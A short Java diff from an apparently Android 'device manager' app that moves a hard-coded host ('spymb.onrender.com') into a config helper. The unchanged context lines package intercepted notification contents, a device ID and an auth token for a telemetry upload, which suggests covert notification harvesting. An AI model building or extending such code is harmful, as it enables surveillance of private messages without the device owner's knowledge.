@@ -36,7 +36,7 @@ public class NotificationListenerSvc extends NotificationListenerService {
 					android.content.SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
 					String token = sp.getString("auth_token", null);
 					String deviceId = sp.getString("deviceId", "unknown");
-					String url = "https://spymb.onrender.com/api/telemetry/" + deviceId;
+					String url = com.company.devicemgr.utils.ApiConfig.api("/api/telemetry/" + deviceId);
 					JSONObject body = new JSONObject();
 					body.put("type", "notification");
 					body.put("payload", payload);
